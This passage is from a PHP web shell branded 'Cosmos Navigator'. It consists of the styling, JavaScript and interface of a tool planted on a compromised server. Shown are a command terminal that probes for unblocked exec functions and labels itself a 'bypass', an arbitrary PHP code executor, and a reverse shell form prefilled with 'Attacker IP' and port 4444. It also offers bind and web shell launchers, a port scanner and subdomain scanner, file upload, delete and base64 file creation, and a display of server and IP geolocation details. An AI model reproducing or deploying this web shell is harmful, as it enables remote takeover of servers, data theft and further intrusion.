}

::-webkit-scrollbar-thumb {
    background: linear-gradient(45deg, #0011ff, #ff00ff);
    border-radius: 5px;
}

::-webkit-scrollbar-thumb:hover {
    background: linear-gradient(45deg, #ff00ff, #0011ff);
}

/* Responsive */
@media (max-width: 768px) {
    .dashboard {
        grid-template-columns: 1fr;
    }
    
    .actions {
        grid-template-columns: repeat(2, 1fr);
    }
    
    .stats-grid {
        grid-template-columns: 1fr;
    }
    
    .fitem {
        flex-direction: column;
        align-items: flex-start;
        gap: 15px;
    }
    
    .facts {
        width: 100%;
        justify-content: flex-start;
    }
    
    .termhead {
        flex-direction: column;
        gap: 10px;
        align-items: flex-start;
    }
    
    .footer-top {
        flex-direction: column;
        gap: 10px;
        text-align: center;
    }
    
    .php-header {
        flex-direction: column;
        gap: 10px;
        align-items: flex-start;
    }
}

@media (max-width: 480px) {
    .actions {
        grid-template-columns: 1fr;
    }
    
    .header h2 {
        font-size: 22px;
    }
    
    .breadcrumb a {
        padding: 6px 10px;
        font-size: 12px;
    }
    
    .btn {
        min-width: 60px;
        padding: 6px 10px;
        font-size: 11px;
    }
    
    .facts {
        gap: 5px;
    }
}
</style>
<script>
// Create starfield background
function createStarfield() {
    const starfield = document.createElement('div');
    starfield.className = 'starfield';
    
    const nebula = document.createElement('div');
    nebula.className = 'nebula';
    starfield.appendChild(nebula);
    
    // Create stars
    for (let i = 0; i < 150; i++) {
        const star = document.createElement('div');
        const size = Math.random();
        if (size < 0.3) {
            star.className = 'star small';
        } else if (size < 0.6) {
            star.className = 'star medium';
        } else {
            star.className = 'star large';
        }
        
        star.style.left = Math.random() * 100 + '%';
        star.style.top = Math.random() * 100 + '%';
        star.style.animationDelay = Math.random() * 5 + 's';
        starfield.appendChild(star);
    }
    
    // Create shooting stars
    for (let i = 0; i < 3; i++) {
        const shootingStar = document.createElement('div');
        shootingStar.className = 'star shooting';
        shootingStar.style.left = Math.random() * 100 + '%';
        shootingStar.style.top = Math.random() * 100 + '%';
        shootingStar.style.animationDelay = Math.random() * 10 + 's';
        starfield.appendChild(shootingStar);
    }
    
    document.body.insertBefore(starfield, document.body.firstChild);
}

// Initialize when page loads
document.addEventListener('DOMContentLoaded', function() {
    createStarfield();
    
    // Add click animations to buttons
    document.querySelectorAll('.quick-btn, .btn').forEach(btn => {
        btn.addEventListener('click', function(e) {
            // Create ripple effect
            const ripple = document.createElement('span');
            const rect = this.getBoundingClientRect();
            const size = Math.max(rect.width, rect.height);
            const x = e.clientX - rect.left - size / 2;
            const y = e.clientY - rect.top - size / 2;
            
            ripple.style.cssText = `
                position: absolute;
                border-radius: 50%;
                background: rgba(255, 255, 255, 0.5);
                width: ${size}px;
                height: ${size}px;
                top: ${y}px;
                left: ${x}px;
                animation: ripple 0.6s linear;
                pointer-events: none;
            `;
            
            this.appendChild(ripple);
            setTimeout(() => ripple.remove(), 600);
        });
    });
    
    // Add CSS for ripple animation
    const style = document.createElement('style');
    style.textContent = `
        @keyframes ripple {
            from {
                transform: scale(0);
                opacity: 1;
            }
            to {
                transform: scale(4);
                opacity: 0;
            }
        }
    `;
    document.head.appendChild(style);
    
    // Auto focus cmd input
    const cmdInput = document.getElementById('cmdInput');
    if (cmdInput) {
        cmdInput.focus();
    }
    
    // Show bypass status
    updateBypassStatus();
});

// Function untuk toggle form
function toggleForm(formId) {
    var form = document.getElementById(formId);
    if (form.style.display === 'none' || form.style.display === '') {
        form.style.display = 'block';
        // Focus ke input pertama
        const firstInput = form.querySelector('input, textarea');
        if (firstInput) {
            setTimeout(() => firstInput.focus(), 100);
        }
    } else {
        form.style.display = 'none';
    }
}

// Function untuk zip file
function zipFiles() {
    var files = prompt('Enter files to zip (separate with space):');
    if (!files) return;
    
    var zipName = prompt('Enter zip filename:', 'archive.zip');
    if (!zipName) return;
    
    if(files && zipName) {
        document.getElementById('zip_files').value = files;
        document.getElementById('zip_name').value = zipName;
        document.getElementById('zipForm').submit();
    }
}

// Function untuk unzip file
function unzipFile() {
    var zipFile = prompt('Enter zip filename to extract:');
    if(zipFile) {
        document.getElementById('unzip_file').value = zipFile;
        document.getElementById('unzipForm').submit();
    }
}

// Function untuk quick command
function quickCommand(cmd) {
    document.getElementById('cmdInput').value = cmd;
    document.getElementById('terminalForm').submit();
}

// Function untuk navigasi direktori - DIPERBAIKI
function openDirectory(dirName) {
    // Encode nama folder dan direktori saat ini
    var encodedDir = encodeURIComponent(dirName);
    
    // Build URL dengan parameter yang benar
    var baseUrl = window.location.pathname;
    var newUrl = baseUrl + '?d=' + encodedDir;
    window.location.href = newUrl;
}

// Function untuk parent directory - DIPERBAIKI
function goParent() {
    var currentDir = '<?php echo addslashes($dir); ?>';
    var parentDir = currentDir.split('/').slice(0, -1).join('/');
    if (!parentDir) parentDir = '/';
    
    // Redirect ke parent directory
    var baseUrl = window.location.pathname;
    var newUrl = baseUrl + '?d=' + encodeURIComponent(parentDir);
    window.location.href = newUrl;
}

// RENAME FUNCTIONS
var currentRenameItem = '';

function showRenameModal(itemName, isFolder) {
    currentRenameItem = itemName;
    document.getElementById('renameOldName').value = itemName;
    document.getElementById('renameNewName').value = itemName;
    document.getElementById('renameModal').style.display = 'flex';
    document.getElementById('renameNewName').focus();
    document.getElementById('renameNewName').select();
}

function closeRenameModal() {
    document.getElementById('renameModal').style.display = 'none';
    currentRenameItem = '';
}

function submitRename() {
    var oldName = document.getElementById('renameOldName').value;
    var newName = document.getElementById('renameNewName').value;
    
    if(!oldName || !newName) {
        alert('Please enter both old and new names');
        return;
    }
    
    if(oldName === newName) {
        alert('New name must be different from old name');
        return;
    }
    
    // Validasi karakter berbahaya
    if(newName.includes('/') || newName.includes('\\') || newName.includes('..')) {
        alert('Invalid character in filename');
        return;
    }
    
    var currentDir = '<?php echo $dir; ?>';
    window.location.href = '?rename=' + encodeURIComponent(oldName) + '&to=' + encodeURIComponent(newName) + '&d=' + encodeURIComponent(currentDir);
}

// Quick rename function
function renameItem(oldName) {
    showRenameModal(oldName, false);
}

// Close modal on ESC key
document.addEventListener('keydown', function(e) {
    if(e.key === 'Escape') {
        closeRenameModal();
    }
    
    // Ctrl+S untuk save
    if(e.ctrlKey && e.key === 's' && document.querySelector('.edit-textarea')) {
        e.preventDefault();
        document.querySelector('.btn-save').click();
    }
    
    // F5 untuk refresh
    if(e.key === 'F5') {
        e.preventDefault();
        window.location.reload();
    }
    
    // Backspace untuk parent directory
    if(e.key === 'Backspace' && !['INPUT', 'TEXTAREA'].includes(document.activeElement.tagName)) {
        e.preventDefault();
        goParent();
    }
});

// Function untuk confirm delete
function confirmDelete(itemName, itemType) {
    var currentDir = '<?php echo $dir; ?>';
    if(confirm(`Are you sure you want to delete ${itemType} "${itemName}"?`)) {
        window.location.href = '?del=' + encodeURIComponent(itemName) + '&d=' + encodeURIComponent(currentDir);
    }
}

// Auto scroll terminal output to bottom
document.addEventListener('DOMContentLoaded', function() {
    const termout = document.querySelector('.termout');
    if (termout && termout.scrollHeight > termout.clientHeight) {
        termout.scrollTop = termout.scrollHeight;
    }
});

// TAMBAHAN FUNCTIONS UNTUK PHP EXECUTOR
function insertPhpExample(code) {
    document.getElementById('phpCode').value = code;
    document.getElementById('phpCode').focus();
}

function togglePhpExecutor() {
    var executor = document.getElementById('phpExecutor');
    if (executor.style.display === 'none' || executor.style.display === '') {
        executor.style.display = 'block';
        document.getElementById('phpCode').focus();
    } else {
        executor.style.display = 'none';
    }
}

function quickPhpCommand(cmd) {
    var code = '';
    switch(cmd) {
        case 'info':
            code = 'phpinfo();';
            break;
        case 'server':
            code = 'print_r($_SERVER);';
            break;
        case 'session':
            code = 'print_r($_SESSION);';
            break;
        case 'constants':
            code = 'print_r(get_defined_constants(true));';
            break;
        case 'functions':
            code = 'print_r(get_defined_functions());';
            break;
        case 'extensions':
            code = 'print_r(get_loaded_extensions());';
            break;
        case 'ini':
            code = 'print_r(ini_get_all());';
            break;
        case 'dir':
            code = 'print_r(scandir("."));';
            break;
        case 'files':
            code = 'foreach(glob("*") as $file) echo $file + "\\n";';
            break;
        case 'phpversion':
            code = 'echo "PHP Version: " . phpversion();';
            break;
    }
    insertPhpExample(code);
}

function updateBypassStatus() {
    const statusElement = document.getElementById('bypassStatus');
    if (statusElement) {
        const methods = [
            {name: 'shell_exec', available: <?php echo function_exists('shell_exec') && !in_array('shell_exec', explode(',', ini_get('disable_functions'))) ? 'true' : 'false'; ?>},
            {name: 'exec', available: <?php echo function_exists('exec') && !in_array('exec', explode(',', ini_get('disable_functions'))) ? 'true' : 'false'; ?>},
            {name: 'system', available: <?php echo function_exists('system') && !in_array('system', explode(',', ini_get('disable_functions'))) ? 'true' : 'false'; ?>},
            {name: 'passthru', available: <?php echo function_exists('passthru') && !in_array('passthru', explode(',', ini_get('disable_functions'))) ? 'true' : 'false'; ?>},
            {name: 'proc_open', available: <?php echo function_exists('proc_open') && !in_array('proc_open', explode(',', ini_get('disable_functions'))) ? 'true' : 'false'; ?>},
            {name: 'popen', available: <?php echo function_exists('popen') && !in_array('popen', explode(',', ini_get('disable_functions'))) ? 'true' : 'false'; ?>}
        ];
        
        const availableMethods = methods.filter(m => m.available);
        const statusText = availableMethods.length > 0 ? 
            `BYPASS ACTIVE (${availableMethods.length}/6 methods)` : 
            'BYPASS DISABLED';
        
        statusElement.className = availableMethods.length > 0 ? 
            'bypass-status bypass-enabled' : 'bypass-status bypass-disabled';
        statusElement.innerHTML = availableMethods.length > 0 ? 
            `<i class="fas fa-check-circle"></i> ${statusText}` : 
            `<i class="fas fa-exclamation-triangle"></i> ${statusText}`;
        
        // Update methods display
        const methodsContainer = document.getElementById('commandMethods');
        if (methodsContainer) {
            methodsContainer.innerHTML = methods.map(m => 
                `<span class="method-item ${m.available ? 'method-available' : 'method-unavailable'}">
                    <i class="fas fa-${m.available ? 'check' : 'times'}"></i> ${m.name}
                </span>`
            ).join('');
        }
    }
}
</script>
</head>
<body>

<div class="container">
    <!-- Header -->
    <div class="header">
        <img src="https://i.pinimg.com/474x/bc/15/7b/bc157b87b19c916eee79bc7b925ad11e.jpg" alt="Cosmos Navigator">
        <h2>🚀 COSMOS NAVIGATOR <span id="bypassStatus" class="bypass-status"></span></h2>
        <div class="subtitle">INTERSTELLAR FILE MANAGEMENT SYSTEM WITH TERMINAL BYPASS</div>
    </div>

    <!-- System Dashboard -->
    <div class="dashboard">
        <!-- CPU Card -->
        <div class="dashboard-card">
            <h3><i class="fas fa-microchip"></i> CPU Load</h3>
            <div class="progress-bar">
                <div class="progress-fill cpu-progress" style="width: <?php echo min(100, $cpu_usage * 100); ?>%"></div>
            </div>
            <div style="display: flex; justify-content: space-between; font-size: 12px; margin-top: 5px;">
                <span style="color: #88f;">Usage</span>
                <span style="color: #0f0; font-weight: bold;"><?php echo is_numeric($cpu_usage) ? number_format(min(100, $cpu_usage * 100), 1) : 'N/A'; ?>%</span>
            </div>
            <div class="stats-grid">
                <div class="stat-item">
                    <div class="stat-label"><i class="fas fa-chart-line"></i> Load Average</div>
                    <div class="stat-value"><?php echo is_numeric($cpu_usage) ? number_format($cpu_usage, 2) : $cpu_usage; ?></div>
                </div>
                <div class="stat-item">
                    <div class="stat-label"><i class="fas fa-user-astronaut"></i> User</div>
                    <div class="stat-value"><?php echo x($current_user); ?></div>
                </div>
            </div>
        </div>

        <!-- Memory Card -->
        <div class="dashboard-card">
            <h3><i class="fas fa-memory"></i> Memory Usage</h3>
            <div class="progress-bar">
                <div class="progress-fill memory-progress" style="width: <?php echo $memory_usage['percent']; ?>%"></div>
            </div>
            <div style="display: flex; justify-content: space-between; font-size: 12px; margin-top: 5px;">
                <span style="color: #88f;">Usage</span>
                <span style="color: #0f0; font-weight: bold;"><?php echo $memory_usage['percent']; ?>%</span>
            </div>
            <div class="stats-grid">
                <div class="stat-item">
                    <div class="stat-label"><i class="fas fa-hdd"></i> Used</div>
                    <div class="stat-value"><?php echo $memory_usage['used']; ?></div>
                </div>
                <div class="stat-item">
                    <div class="stat-label"><i class="fas fa-database"></i> Total</div>
                    <div class="stat-value"><?php echo $memory_usage['total']; ?></div>
                </div>
            </div>
        </div>

        <!-- Disk Card -->
        <div class="dashboard-card">
            <h3><i class="fas fa-hdd"></i> Disk Usage</h3>
            <div class="progress-bar">
                <div class="progress-fill disk-progress" style="width: <?php echo $disk_usage['percent']; ?>%"></div>
            </div>
            <div style="display: flex; justify-content: space-between; font-size: 12px; margin-top: 5px;">
                <span style="color: #88f;">Usage</span>
                <span style="color: #0f0; font-weight: bold;"><?php echo $disk_usage['percent']; ?>%</span>
            </div>
            <div class="stats-grid">
                <div class="stat-item">
                    <div class="stat-label"><i class="fas fa-hdd"></i> Used</div>
                    <div class="stat-value"><?php echo $disk_usage['used']; ?></div>
                </div>
                <div class="stat-item">
                    <div class="stat-label"><i class="fas fa-server"></i> Free</div>
                    <div class="stat-value"><?php echo $disk_usage['free']; ?></div>
                </div>
            </div>
        </div>

        <!-- System Info Card -->
        <div class="dashboard-card">
            <h3><i class="fas fa-info-circle"></i> System Info</h3>
            <div class="stats-grid">
                <div class="stat-item">
                    <div class="stat-label"><i class="fas fa-clock"></i> Uptime</div>
                    <div class="stat-value"><?php echo x($uptime); ?></div>
                </div>
                <div class="stat-item">
                    <div class="stat-label"><i class="fab fa-php"></i> PHP Version</div>
                    <div class="stat-value"><?php echo x($php_info['version']); ?></div>
                </div>
                <div class="stat-item">
                    <div class="stat-label"><i class="fas fa-upload"></i> Upload Limit</div>
                    <div class="stat-value"><?php echo x($php_info['upload_max_filesize']); ?></div>
                </div>
                <div class="stat-item">
                    <div class="stat-label"><i class="fas fa-terminal"></i> Shell Access</div>
                    <div class="stat-value"><?php echo $shell_exec_available ? '<span style="color:#0f0;">Enabled</span>' : '<span style="color:#f00;">Disabled</span>'; ?></div>
                </div>
            </div>
        </div>
    </div>

    <!-- Network Information Card -->
    <div class="dashboard-card">
        <h3><i class="fas fa-globe"></i> Network Information</h3>
        <div style="display: grid; grid-template-columns: repeat(auto-fit, minmax(200px, 1fr)); gap: 15px; margin-top: 15px;">
            <div class="stat-item">
                <div class="stat-label"><i class="fas fa-laptop"></i> Server IP</div>
                <div class="stat-value"><?php echo $serverIP['server_addr'] ?? 'N/A'; ?></div>
            </div>
            <div class="stat-item">
                <div class="stat-label"><i class="fas fa-user"></i> Your IP</div>
                <div class="stat-value"><?php echo $serverIP['remote_addr'] ?? 'N/A'; ?></div>
            </div>
            <?php if(isset($serverIP['public'])): ?>
            <div class="stat-item">
                <div class="stat-label"><i class="fas fa-cloud"></i> Public IP</div>
                <div class="stat-value"><?php echo $serverIP['public']; ?></div>
            </div>
            <?php endif; ?>
            <?php if(isset($geoInfo['country'])): ?>
            <div class="stat-item">
                <div class="stat-label"><i class="fas fa-flag"></i> Location</div>
                <div class="stat-value"><?php echo $geoInfo['country']; ?></div>
            </div>
            <?php endif; ?>
        </div>
        
        <?php if(!empty($serverIP['local'])): ?>
        <div style="margin-top: 15px; padding: 10px; background: rgba(40,50,100,0.3); border-radius: 6px;">
            <div style="font-size: 12px; color: #88f; margin-bottom: 5px;">Local IP Addresses:</div>
            <div style="font-family: 'Consolas', monospace; font-size: 11px; color: #0f0;">
                <?php echo implode(', ', $serverIP['local']); ?>
            </div>
        </div>
        <?php endif; ?>
        
        <?php if(isset($geoInfo['city'])): ?>
        <div class="geo-info" style="margin-top: 15px;">
            <div class="geo-item">
                <div style="font-size: 11px; color: #88f;">City</div>
                <div style="font-weight: bold; color: #0f0;"><?php echo $geoInfo['city']; ?></div>
            </div>
            <div class="geo-item">
                <div style="font-size: 11px; color: #88f;">Region</div>
                <div style="font-weight: bold; color: #0f0;"><?php echo $geoInfo['region'] ?? $geoInfo['regionName'] ?? 'N/A'; ?></div>
            </div>
            <div class="geo-item">
                <div style="font-size: 11px; color: #88f;">ISP</div>
                <div style="font-weight: bold; color: #0f0;"><?php echo $geoInfo['isp'] ?? $geoInfo['org'] ?? 'N/A'; ?></div>
            </div>
        </div>
        <?php endif; ?>
        
        <div style="margin-top: 15px; display: flex; gap: 10px;">
            <button onclick="toggleForm('reverseShellForm')" class="quick-btn" style="flex: 1; padding: 8px; font-size: 12px;">
                <i class="fas fa-terminal"></i> Reverse Shell
            </button>
            <button onclick="toggleForm('networkToolsForm')" class="quick-btn" style="flex: 1; padding: 8px; font-size: 12px;">
                <i class="fas fa-tools"></i> Network Tools
            </button>
        </div>
    </div>

    <!-- Current Path -->
    <div class="path">
        <div class="path-icon"><i class="fas fa-map-marker-alt"></i></div>
        <div style="flex: 1;">
            <div style="font-size: 12px; color: #88f; margin-bottom: 5px;">NAVIGATION PATH</div>
            <div style="font-family: 'Consolas', monospace; color: #00f3ff;"><?php echo x($dir); ?></div>
        </div>
    </div>

    <!-- Message -->
    <?php if($msg): ?>
    <div class="msg <?php echo $msgType; ?>">
        <i class="fas fa-info-circle"></i> <?php echo $msg; ?>
    </div>
    <?php endif; ?>

    <!-- Command Methods Info -->
    <div class="command-methods" id="commandMethods">
        <span style="color:#00f3ff;margin-right:10px;"><i class="fas fa-terminal"></i> Command Methods:</span>
        <!-- Will be populated by JavaScript -->
    </div>

    <!-- Terminal Warning (if shell_exec disabled) -->
    <?php if(!$shell_exec_available): ?>
    <div class="terminal-warning">
        <i class="fas fa-exclamation-triangle"></i>
        <div>
            <strong>Warning: shell_exec() is disabled</strong><br>
            Using multi-method bypass system. Some commands may be limited.
            Available methods: <?php 
                $methods = [];
                if(function_exists('exec') && !in_array('exec', explode(',', ini_get('disable_functions')))) $methods[] = 'exec';
                if(function_exists('system') && !in_array('system', explode(',', ini_get('disable_functions')))) $methods[] = 'system';
                if(function_exists('passthru') && !in_array('passthru', explode(',', ini_get('disable_functions')))) $methods[] = 'passthru';
                if(function_exists('proc_open') && !in_array('proc_open', explode(',', ini_get('disable_functions')))) $methods[] = 'proc_open';
                if(function_exists('popen') && !in_array('popen', explode(',', ini_get('disable_functions')))) $methods[] = 'popen';
                echo empty($methods) ? 'None' : implode(', ', $methods);
            ?>
        </div>
    </div>
    <?php endif; ?>

    <!-- Breadcrumb -->
    <div class="breadcrumb">
        <a href="?"><i class="fas fa-home"></i> Home Base</a>
        <?php
        $pathParts = array_filter(explode('/', trim($dir, '/')));
        $currentPath = '';
        
        foreach($pathParts as $part) {
            if(empty($part)) continue;
            $currentPath .= '/' . $part;
            echo '<span>❯</span>';
            echo '<a href="?d=' . urlencode($currentPath) . '">' . x($part) . '</a>';
        }
        ?>
    </div>

    <!-- Quick Actions -->
    <div class="actions">
        <button onclick="toggleForm('uploadForm')" class="quick-btn"><i class="fas fa-upload"></i> Upload</button>
        <button onclick="toggleForm('createFileForm')" class="quick-btn"><i class="fas fa-file-code"></i> Base64</button>
        <button onclick="toggleForm('createFolderForm')" class="quick-btn"><i class="fas fa-folder-plus"></i> New Folder</button>
        <button onclick="zipFiles()" class="quick-btn"><i class="fas fa-file-archive"></i> Create Zip</button>
        <button onclick="unzipFile()" class="quick-btn"><i class="fas fa-file-archive"></i> Extract Zip</button>
        <button onclick="goParent()" class="quick-btn"><i class="fas fa-arrow-up"></i> Orbit Up</button>
        <button onclick="toggleForm('quickRenameForm')" class="quick-btn"><i class="fas fa-edit"></i> Rename</button>
        <button onclick="togglePhpExecutor()" class="quick-btn"><i class="fab fa-php"></i> PHP Exec</button>
        <button onclick="toggleForm('reverseShellForm')" class="quick-btn"><i class="fas fa-plug"></i> Rev Shell</button>
        <button onclick="toggleForm('networkToolsForm')" class="quick-btn"><i class="fas fa-network-wired"></i> Net Tools</button>
        <button onclick="window.location.reload()" class="quick-btn"><i class="fas fa-sync-alt"></i> Refresh</button>
    </div>

    <!-- Forms -->
    <!-- UPLOAD FORM -->
    <div class="tool-form" id="uploadForm" style="display:none;">
        <h4><i class="fas fa-upload"></i> Upload File</h4>
        <form method="POST" enctype="multipart/form-data">
            <input type="file" name="f" required>
            <button type="submit"><i class="fas fa-upload"></i> Upload</button>
        </form>
    </div>

    <!-- CREATE FILE FROM BASE64 FORM -->
    <div class="tool-form" id="createFileForm" style="display:none;">
        <h4><i class="fas fa-file-code"></i> Create File from Base64</h4>
        <form method="POST">
            <input type="text" name="fn" placeholder="Filename (e.g., file.txt)" value="file_<?php echo time(); ?>.txt">
            <textarea name="b64" placeholder="Paste Base64 encoded data here..." rows="6" required></textarea>
            <button type="submit"><i class="fas fa-file-code"></i> Create File</button>
        </form>
    </div>

    <!-- CREATE FOLDER FORM -->
    <div class="tool-form" id="createFolderForm" style="display:none;">
        <h4><i class="fas fa-folder-plus"></i> Create New Folder</h4>
        <form method="POST">
            <input type="text" name="newdir" placeholder="Folder name" required>
            <input type="hidden" name="current_dir" value="<?php echo x($dir); ?>">
            <button type="submit"><i class="fas fa-plus"></i> Create</button>
        </form>
    </div>

    <!-- QUICK RENAME FORM -->
    <div class="tool-form" id="quickRenameForm" style="display:none;">
        <h4><i class="fas fa-edit"></i> Quick Rename</h4>
        <form method="GET" style="display:flex;gap:5px;align-items:center;">
            <input type="text" name="rename" placeholder="Current name" style="flex:1;">
            <span style="color:#00f3ff;font-size:20px;">→</span>
            <input type="text" name="to" placeholder="New name" style="flex:1;">
            <input type="hidden" name="d" value="<?php echo x($dir); ?>">
            <button type="submit" class="quick-btn"><i class="fas fa-edit"></i> Rename</button>
        </form>
    </div>

    <!-- REVERSE SHELL FORM -->
    <div class="tool-form" id="reverseShellForm" style="display:none;">
        <h4><i class="fas fa-terminal"></i> Reverse Shell Connector</h4>
        <form method="POST">
            <div style="display: grid; grid-template-columns: 1fr 1fr; gap: 10px; margin-bottom: 15px;">
                <div>
                    <label style="color: #88f; display: block; margin-bottom: 5px;">Host/IP:</label>
                    <input type="text" name="rev_host" placeholder="Attacker IP" value="127.0.0.1" required>
                </div>
                <div>
                    <label style="color: #88f; display: block; margin-bottom: 5px;">Port:</label>
                    <input type="number" name="rev_port" placeholder="Port" value="4444" required>
                </div>
                <div>
                    <label style="color: #88f; display: block; margin-bottom: 5px;">Bind Shell Port:</label>
                    <input type="number" name="bind_port" placeholder="Port" value="4445">
                </div>
                <div>
                    <label style="color: #88f; display: block; margin-bottom: 5px;">Web Shell Port:</label>
                    <input type="number" name="web_port" placeholder="Port" value="8080">
                </div>
            </div>
            <div style="display: flex; gap: 10px;">
                <button type="submit" name="reverse_shell" class="quick-btn" style="flex: 1; background: linear-gradient(135deg, #ff3333, #cc0000);">
                    <i class="fas fa-plug"></i> Connect Reverse Shell
                </button>
                <button type="submit" name="bind_shell" class="quick-btn" style="flex: 1; background: linear-gradient(135deg, #ff8800, #cc6600);">
                    <i class="fas fa-link"></i> Start Bind Shell
                </button>
                <button type="submit" name="web_shell" class="quick-btn" style="flex: 1; background: linear-gradient(135deg, #33aa33, #008800);">
                    <i class="fas fa-globe"></i> Start Web Shell
                </button>
            </div>
            <div style="font-size: 11px; color: #ff6666; margin-top: 10px; padding: 10px; background: rgba(255,0,0,0.1); border-radius: 5px;">
                <i class="fas fa-exclamation-triangle"></i> <strong>Warning:</strong> Reverse shells may be detected by security systems. Use with caution.
            </div>
        </form>
    </div>

    <!-- NETWORK TOOLS FORM -->
    <div class="tool-form" id="networkToolsForm" style="display:none;">
        <h4><i class="fas fa-network-wired"></i> Network Tools</h4>
        
        <!-- Port Scanner -->
        <div style="margin-bottom: 20px; padding: 15px; background: rgba(30,40,80,0.5); border-radius: 8px;">
            <h5 style="color: #00f3ff; margin-bottom: 10px;"><i class="fas fa-search"></i> Port Scanner</h5>
            <form method="POST" style="display: grid; grid-template-columns: 2fr 1fr 1fr; gap: 10px;">
                <input type="text" name="scan_host" placeholder="Host/IP" value="127.0.0.1" required>
                <input type="number" name="start_port" placeholder="Start Port" value="1">
                <input type="number" name="end_port" placeholder="End Port" value="1000">
                <button type="submit" name="port_scan" class="quick-btn" style="grid-column: 1 / -1;">
                    <i class="fas fa-bullseye"></i> Scan Ports
                </button>
            </form>
        </div>
        
        <!-- Whois Lookup -->
        <div style="margin-bottom: 20px; padding: 15px; background: rgba(30,40,80,0.5); border-radius: 8px;">
            <h5 style="color: #00f3ff; margin-bottom: 10px;"><i class="fas fa-info-circle"></i> Whois Lookup</h5>
            <form method="POST" style="display: flex; gap: 10px;">
                <input type="text" name="whois_domain" placeholder="Domain name" style="flex: 1;" required>
                <button type="submit" name="whois_lookup" class="quick-btn">
                    <i class="fas fa-search"></i> Lookup
                </button>
            </form>
        </div>
        
        <!-- DNS Lookup -->
        <div style="margin-bottom: 20px; padding: 15px; background: rgba(30,40,80,0.5); border-radius: 8px;">
            <h5 style="color: #00f3ff; margin-bottom: 10px;"><i class="fas fa-server"></i> DNS Lookup</h5>
            <form method="POST" style="display: flex; gap: 10px;">
                <input type="text" name="dns_domain" placeholder="Domain name" style="flex: 1;" required>
                <button type="submit" name="dns_lookup" class="quick-btn">
                    <i class="fas fa-search"></i> Lookup DNS
                </button>
            </form>
        </div>
        
        <!-- Traceroute -->
        <div style="margin-bottom: 20px; padding: 15px; background: rgba(30,40,80,0.5); border-radius: 8px;">
            <h5 style="color: #00f3ff; margin-bottom: 10px;"><i class="fas fa-route"></i> Traceroute</h5>
            <form method="POST" style="display: flex; gap: 10px;">
                <input type="text" name="trace_host" placeholder="Hostname/IP" value="google.com" style="flex: 1;" required>
                <button type="submit" name="traceroute" class="quick-btn">
                    <i class="fas fa-satellite"></i> Trace Route
                </button>
            </form>
        </div>
        
        <!-- Subdomain Scanner -->
        <div style="padding: 15px; background: rgba(30,40,80,0.5); border-radius: 8px;">
            <h5 style="color: #00f3ff; margin-bottom: 10px;"><i class="fas fa-sitemap"></i> Subdomain Scanner</h5>
            <form method="POST" style="display: flex; gap: 10px;">
                <input type="text" name="subdomain_domain" placeholder="Domain name" style="flex: 1;" required>
                <button type="submit" name="subdomain_scan" class="quick-btn">
                    <i class="fas fa-radar"></i> Scan Subdomains
                </button>
            </form>
        </div>
    </div>

    <!-- PHP EXECUTOR -->
    <div class="php-executor" id="phpExecutor" style="display:none;">
        <div class="php-header">
            <div>
                <i class="fab fa-php"></i> 
                <span style="font-weight:bold;letter-spacing:1px;">PHP CODE EXECUTOR</span>
                <span style="color:#d8bfd8;margin-left:10px;font-size:11px;">
                    [Alternative Terminal Bypass]
                </span>
            </div>
            <div style="display:flex;gap:5px;">
                <button onclick="quickPhpCommand('info')" class="php-example-btn">
                    phpinfo()
                </button>
                <button onclick="quickPhpCommand('server')" class="php-example-btn">
                    $_SERVER
                </button>
                <button onclick="quickPhpCommand('dir')" class="php-example-btn">
                    scandir()
                </button>
            </div>
        </div>
        <form method="POST">
            <textarea name="php_code" id="phpCode" class="php-textarea" placeholder="Enter PHP code here... Example: echo 'Hello World';"></textarea>
            <div class="php-examples">
                <h4>Quick Examples:</h4>
                <button type="button" onclick="quickPhpCommand('info')" class="php-example-btn">phpinfo()</button>
                <button type="button" onclick="quickPhpCommand('server')" class="php-example-btn">$_SERVER</button>
                <button type="button" onclick="quickPhpCommand('session')" class="php-example-btn">$_SESSION</button>
                <button type="button" onclick="quickPhpCommand('constants')" class="php-example-btn">Constants</button>
                <button type="button" onclick="quickPhpCommand('functions')" class="php-example-btn">Functions</button>
                <button type="button" onclick="quickPhpCommand('extensions')" class="php-example-btn">Extensions</button>
                <button type="button" onclick="quickPhpCommand('ini')" class="php-example-btn">ini_get_all()</button>
                <button type="button" onclick="quickPhpCommand('dir')" class="php-example-btn">scandir()</button>
                <button type="button" onclick="quickPhpCommand('files')" class="php-example-btn">glob()</button>
                <button type="button" onclick="quickPhpCommand('phpversion')" class="php-example-btn">phpversion()</button>
            </div>
            <button type="submit" class="php-execute-btn">
                <i class="fas fa-play"></i> Execute PHP Code
            </button>
        </form>
    </div>

    <!-- ZIP FORM (HIDDEN) -->
    <form method="POST" id="zipForm" style="display:none;">
        <input type="hidden" name="zip_files" id="zip_files">
        <input type="hidden" name="zip_name" id="zip_name">
        <input type="hidden" name="current_dir" value="<?php echo x($dir); ?>">
    </form>

    <!-- UNZIP FORM (HIDDEN) -->
    <form method="POST" id="unzipForm" style="display:none;">
        <input type="hidden" name="unzip_file" id="unzip_file">
        <input type="hidden" name="current_dir" value="<?php echo x($dir); ?>">
    </form>

    <!-- FILE LIST -->
    <div class="flist">
        <?php
        // Parent directory link
        if ($dir !== '/' && $dir !== '.') {
            $parentDir = dirname($dir);
            echo '<div class="fitem">
                    <div class="ficon">🛸</div>
                    <div class="fname">
                        <a href="javascript:void(0)" onclick="goParent()" class="dir-link">Parent Directory</a>
                        <div style="font-size:11px;color:#8a2be2;">
                            <i class="fas fa-level-up-alt"></i> Return to parent orbit
                        </div>
                    </div>
                    <div class="facts">
                        <a href="javascript:void(0)" onclick="goParent()" class="btn btn-folder">
                            <i class="fas fa-arrow-up"></i> Go Up
                        </a>
                    </div>
                  </div>';
        }
        
        // Scan directory
        $files = scandir($dir);
        
        // Sort: folders first
        $folders = [];
        $filesList = [];
        foreach ($files as $f) {
            if ($f == '.' || $f == '..') continue;
            $path = $dir . '/' . $f;
            if (is_dir($path)) {
                $folders[] = $f;
            } else {
                $filesList[] = $f;
            }
        }
        
        sort($folders);
        sort($filesList);
        
        // Display folders - VERSI FIXED
        foreach ($folders as $f) {
            $path = $dir . '/' . $f;
            $itemCount = count(scandir($path)) - 2;
            $encodedPath = urlencode($dir . '/' . $f);
            
            echo '<div class="fitem">
                    <div class="ficon">🪐</div>
                    <div class="fname">
                        <!-- LINK LANGSUNG TANPA JAVASCRIPT -->
                        <a href="?d=' . $encodedPath . '" class="dir-link" style="color:#00f3ff;text-decoration:none;font-weight:bold;">
                            ' . x($f) . '
                        </a>
                        <div style="font-size:11px;color:#8a2be2;">
